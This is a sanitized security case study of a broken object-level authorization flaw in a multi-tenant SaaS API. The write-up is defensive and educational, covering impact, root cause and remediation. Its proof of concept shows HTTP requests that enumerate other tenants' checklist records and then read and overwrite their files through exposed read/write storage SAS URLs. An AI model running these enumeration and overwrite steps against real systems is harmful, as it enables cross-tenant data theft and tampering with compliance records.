# Broken Object Level Authorization in Multi-Tenant SaaS API

> This is a sanitized and anonymized case study based on a real-world issue discovered during a security assessment.
> All identifiers, endpoints, and data structures have been modified to prevent disclosure of sensitive or proprietary information.

## Summary
During an application security assessment of a multi-tenant SaaS platform, a Broken Object Level Authorization (BOLA) vulnerability was identified in an API endpoint responsible for retrieving feature checklist records. The issue allowed authenticated users to access compliance checklists and attached documents belonging to other tenants by manipulating object identifiers. Additionally, the API response exposed Azure Blob Storage SAS URLs with excessive read and write permissions, enabling unauthorized modification of business-critical compliance records.

## Severity: High

**CVSS v4.0 Score:** 8.4 (High)

**Justification:**
- Broken Object Level Authorization (BOLA) in a multi-tenant SaaS environment
- Unauthorized cross-tenant access to compliance and audit records
- Exposure of Azure Blob Storage SAS URLs with excessive permissions (read/write)
- Enables unauthorized modification and replacement of official compliance documents
- Low attack complexity, requiring only an authenticated user
- High business impact due to violation of tenant isolation, data integrity, and regulatory compliance requirements

Despite being accessible only to authenticated users, this vulnerability enables full compromise of sensitive compliance records across tenants, making the real-world impact high.

## Application Context
- **Architecture:** Multi-tenant SaaS
- **Authentication:** Required (valid user session)
- **Authorization model:** Tenant-based access control
- **Sensitive data involved:** Compliance checklists, digital signatures, audit records, business attachments

## Affected Endpoint (Anonymized)
```http
GET /api/features/checklist/{resourceId}
```

**Intended behavior:** Return feature checklist details only if the requested resource belongs to the authenticated user's tenant.

## Vulnerability Description
The endpoint validated that the requester was authenticated but failed to enforce object-level authorization. By modifying the `resourceId` path parameter, an authenticated user could retrieve feature checklist records associated with other tenants.

The API response contained Azure Blob Storage SAS URLs with excessive permissions (read/write) for checklist attachments, allowing the attacker to directly read and overwrite sensitive files stored in Blob Storage. This creates a dual vulnerability: both unauthorized data access (confidentiality) and unauthorized data modification (integrity).

### Authorization Bypass Pattern
Testing revealed that certain `resourceId` values (including edge cases like 0) bypassed tenant isolation checks and returned data from other tenants, indicating **inconsistent or missing tenant validation** in the authorization logic.

## Proof of Concept (Sanitized)

### Testing Methodology
- Manual API testing using OWASP ZAP as an intercepting proxy
- Automated fuzzing of path parameters to identify authorization gaps
- Sequential ID enumeration to test tenant isolation boundaries
- Validation of exposed SAS URLs to confirm read/write access to blob storage
- All findings manually verified by reviewing requests and responses

### Exploitation Steps

```http
# Step 1: Requesting a feature checklist by manipulating the resourceId parameter
GET /api/features/checklist/0 HTTP/1.1
Host: api.example.com

HTTP/1.1 200 OK
{
    "id": 178177,
    "tenantId": 2626,
    "featureId": 16,
    "title": "Safety Compliance Checklist",
    "responsiblePersonId": 60480,
    "checklistData": {
        "sections": [
            {
                "title": "Equipment Safety",
                "items": [
                    {
                        "title": "Fire Extinguisher Inspection",
                        "attachments": [
                            {
                                "filename": "inspection-photo.jpg",
                                "mimetype": "image/jpeg",
                                "size": 364837,
                                "path": "https://storage.example.net/tenant-2626/checklists/inspection-photo-20251201.jpg?sv=2023-11-03&st=2026-01-30T07:08:56Z&se=2026-01-30T08:13:56Z&sr=b&sp=rw&sig=REDACTED_SIGNATURE_TOKEN"
                            }
                        ],
                        "signature": "Digital Signature: John Smith 01/12/2025 13:15",
                        "status": "Approved"
                    }
                ]
            },
            {
                "title": "Workplace Safety",
                "items": [
                    {
                        "title": "Emergency Exit Check",
                        "attachments": [
                            {
                                "filename": "exit-documentation.jpg",
                                "path": "https://storage.example.net/tenant-2626/checklists/exit-doc-20251201.jpg?sv=2023-11-03&st=2025-12-01T12:10:52Z&se=2125-12-01T12:15:52Z&sr=b&sp=rw&sig=REDACTED_SIGNATURE_TOKEN"
                            }
                        ],
                        "signature": "Digital Signature: John Smith 01/12/2025 13:15",
                        "status": "Approved"
                    }
                ]
            }
        ]
    },
    "status": "Completed",
    "createdBy": 60480,
    "createdOn": "2025-12-01T13:16:12.963"
}

# Unauthorized cross-tenant access to tenant 2626's compliance records
# Exposes Azure Blob Storage SAS URLs with read/write permissions (sp=rw)
# Different tenant than the authenticated user
```

```http
# Step 2: Direct access to blob storage using exposed SAS URL
GET https://storage.example.net/tenant-2626/checklists/inspection-photo-20251201.jpg?sv=2023-11-03&st=2026-01-30T07:08:56Z&se=2026-01-30T08:13:56Z&sr=b&sp=rw&sig=REDACTED_SIGNATURE_TOKEN HTTP/1.1
Host: storage.example.net

HTTP/1.1 200 OK
Content-Type: image/jpeg
[BINARY_DOCUMENT_CONTENT]

# Successful unauthorized read of compliance document
```

```http
# Step 3: Overwriting the document using write permissions in the SAS URL
PUT https://storage.example.net/tenant-2626/checklists/inspection-photo-20251201.jpg?sv=2023-11-03&st=2026-01-30T07:08:56Z&se=2026-01-30T08:13:56Z&sr=b&sp=rw&sig=REDACTED_SIGNATURE_TOKEN HTTP/1.1
Host: storage.example.net
x-ms-blob-type: BlockBlob
Content-Type: image/jpeg

[MALICIOUS_PAYLOAD_OR_MODIFIED_IMAGE]

HTTP/1.1 201 Created

# Successful unauthorized modification of compliance document
# Original evidence has been tampered with or destroyed
```

## Impact Metrics
- **Testing sample:** 500 resourceId values tested (range: 0-500)
- **Vulnerable records:** Multiple records returned 200 OK with cross-tenant data
- **SAS URL exposure:** All returned records exposed blob storage URLs with read/write permissions
- **Enumeration feasibility:** High (sequential and predictable identifiers)

## Impact

The identified Broken Object Level Authorization (BOLA) vulnerability poses a significant risk to data confidentiality, integrity, and multi-tenant isolation:

### Confidentiality Impact
- **Multi-Tenancy Breach:** Complete bypass of tenant boundaries, allowing one client to access another client's feature checklists and compliance records
- **Unauthorized Data Disclosure:** Access to sensitive business operational data, including responsible parties, completion status, digital signatures, and attached documentation
- **Regulatory Non-compliance:** Direct violation of GDPR and data protection laws due to unauthorized access across tenant boundaries

### Integrity Impact
- **Data Integrity and Ransomware Risk:** The exposure of SAS tokens with write permissions allows an attacker to delete, corrupt, or overwrite business-critical checklist attachments. This could be used to inject malicious files or perform a ransomware-style attack by encrypting/deleting hosted data
- **Compliance Record Tampering:** Ability to modify checklists containing digital signatures and compliance verification records, undermining audit trails and regulatory compliance
- **Evidence Destruction:** Attackers can remove or replace documentation that proves safety violations, quality issues, or other compliance failures

### Business Impact
- **Loss of Trust:** Customers lose confidence in the platform's ability to protect their data
- **Legal Liability:** Potential lawsuits from affected customers due to data breach
- **Regulatory Penalties:** GDPR fines up to €20 million or 4% of annual revenue (whichever is higher)
- **Certification Loss:** Violation of ISO 9001, ISO 27001, and other compliance standards
- **Attack Scalability:** Predictable integer identifiers enable automated mass enumeration of checklist data across all tenants

## Root Cause Analysis

### Missing Tenant Validation
- Authentication exists, but the system fails to verify resource ownership (tenant-to-object mapping)
- The endpoint does not validate that the requested `resourceId` belongs to the authenticated user's tenant

### Decentralized Authorization
- Security checks are inconsistent across the codebase rather than managed by a central authorization service
- Indicates authorization logic was implemented ad-hoc rather than through a framework

### Insecure Direct Object References (IDOR)
- Sequential integer IDs allow for easy data enumeration and mass scraping
- Predictable identifiers enable systematic exploitation across all tenants

### Input Over-Trust
- Server-side logic trusts user-supplied IDs without cross-referencing them against the authenticated user's session context and tenant scope

### Excessive Permissions (Least Privilege Violation)
- Azure Blob Storage SAS URLs are generated with broad read/write permissions (sp=rw) instead of limiting scope to read-only
- Exposes direct storage URLs to client-side users instead of serving documents through server-mediated access with proper authorization

## Recommended Remediation

### Immediate Actions
1. **Implement Tenant Validation:** Add tenant ownership checks to verify that requested resources belong to the authenticated user's tenant before returning any data
2. **Revoke Excessive Permissions:** Regenerate all SAS tokens with read-only permissions and minimal time-to-live
3. **Disable Direct Storage Access:** Remove SAS URLs from API responses; serve documents through server-mediated endpoints with proper authorization

### Long-term Solutions
1. **Centralize Authorization Logic:** Implement a centralized authorization service to ensure consistent enforcement across all endpoints
2. **Replace Sequential IDs:** Use UUIDs or non-sequential identifiers for external-facing APIs to prevent enumeration
3. **Implement Least Privilege:** Generate SAS tokens with minimum required permissions (read-only when possible) and short expiration times
4. **Add Audit Logging:** Implement comprehensive logging for all authorization failures and cross-tenant access attempts
5. **Automated Testing:** Integrate negative authorization tests into the CI/CD pipeline to detect cross-tenant access attempts before deployment
6. **Security Framework:** Adopt a security framework that enforces authorization by default rather than requiring manual implementation

### Defense in Depth
- Implement rate limiting to prevent mass enumeration
- Add anomaly detection for suspicious access patterns
- Require additional authentication for sensitive compliance operations
- Implement immutable audit logs for all compliance record modifications

## Lessons Learned

1. **Authentication ≠ Authorization:** Being logged in does not mean you should access everything
2. **Multi-tenancy requires explicit validation:** Never trust that an ID belongs to the current user's tenant
3. **Direct storage access is dangerous:** SAS URLs bypass application-level authorization
4. **Write permissions amplify risk:** Read-only access is bad; read-write access enables data destruction
5. **Compliance data requires special protection:** Records with legal/regulatory significance need immutability controls
6. **Sequential IDs enable enumeration:** Predictable identifiers make mass exploitation trivial

## Status
The issue was responsibly disclosed and has since been remediated. This case study is shared for educational purposes to help developers and security professionals understand the risks of inadequate authorization controls in multi-tenant applications.
